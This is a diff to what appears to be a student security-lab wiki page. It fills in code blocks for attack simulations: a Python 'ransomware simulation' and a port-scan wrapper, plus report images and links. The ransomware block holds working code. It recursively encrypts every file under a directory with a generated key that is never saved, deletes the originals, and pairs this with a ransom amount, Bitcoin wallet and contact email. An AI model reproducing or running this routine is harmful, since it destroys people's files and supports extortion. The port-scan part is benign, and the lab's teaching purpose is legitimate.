@@ -71,12 +71,56 @@ Key Features:
 
 ```python
 #!/bin/python3
-# TO FILL
+
+def simulate_encryption(target_dir):
+    files_encrypted = 0
+    encryption_algorithm = "AES-256-CBC"
+
+    key = Fernet.generate_key()
+    cipher = Fernet(key)
+
+    for root, _, files in os.walk(target_dir):
+        for file in files:
+            if not file.endswith(".encrypted"):
+                old_path = os.path.join(root, file)
+                new_path = old_path + ".encrypted"
+                try:
+                    with open(old_path, 'rb') as f:
+                        data = f.read()
+                    encrypted_data = cipher.encrypt(data)
+                    with open(new_path, 'wb') as f:
+                        f.write(encrypted_data)
+                    os.remove(old_path)
+                    files_encrypted += 1
+                    print(f"[+] Encrypted: {new_path}")
+                    time.sleep(0.05)
+                except Exception as e:
+                    print(f"[!] Failed to encrypt: {old_path} ({e})")
+    
+    return files_encrypted, encryption_algorithm
+
+if __name__ == "__main__":
+    target_directory = "test_data"
+    ransom_amount = "0.05 BTC"
+    payment_wallet = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+    contact_email = "helpdesk@lunalynx.local"
+    
+    encrypted_count, algorithm_used = simulate_encryption(target_directory)
+    
+    RansomwareReporter.generate_report(
+        target_dir=target_directory,
+        files_encrypted=encrypted_count,
+        encryption_algorithm=algorithm_used,
+        ransom_amount=ransom_amount,
+        payment_wallet=payment_wallet,
+        contact_email=contact_email
+    )
+
 ```
 
-Ransomware Rqport
+Ransomware Raport
 
-~~image here~~
+![Ransomware report](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Petre%20Radu%20Catalin/images/4.png?raw=true)
 
 Fig 1.2: Simulation report showing encrypted test files and recovery key
 
@@ -87,12 +131,27 @@ Code Structure:
 
 ```python
 #!/bin/python3
-# TO FILL
+from scanner import scan_target
+from reporter import generate_firewall_report
+
+def main():
+    print("=== Misconfigured Firewall Simulation ===")
+    ip = input("[?] Enter target IP: ").strip()
+    results = scan_target(ip)
+    if results:
+        print(f"[+] Found {len(results)} risky open ports.")
+        generate_firewall_report(ip, results)
+    else:
+        print("[✓] No open risky ports found.")
+
+if __name__ == "__main__":
+    main()
+
 ```
 
 Port Scan Report
 
-~~image here~~
+![Firewall misconfig report](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Petre%20Radu%20Catalin/images/5.png?raw=true)
 
 Fig 1.3: Auto-generated report identifying open ports on DVWA host
 
@@ -122,7 +181,7 @@ Available in `/wiki/reports/`:
 - [syn_flood_report.html](https://htmlpreview.github.io/?https://raw.githubusercontent.com/LunaLynx12/GISC/main/wiki/Attack%20Scripts/Petre%20Radu%20Catalin/reports/syn_flood_report.html
 )
 
-- ransomware_template.html [link]
+- [ransomware_simulation_report.html](https://htmlpreview.github.io/?https://raw.githubusercontent.com/LunaLynx12/GISC/main/wiki/Attack%20Scripts/Petre%20Radu%20Catalin/reports/ransomware_simulation_report.html)
 
-- portscan_template.html [link]
+- [firewall_misconfig_report.html](https://htmlpreview.github.io/?https://raw.githubusercontent.com/LunaLynx12/GISC/main/wiki/Attack%20Scripts/Petre%20Radu%20Catalin/reports/firewall_misconfig_report.html)
 
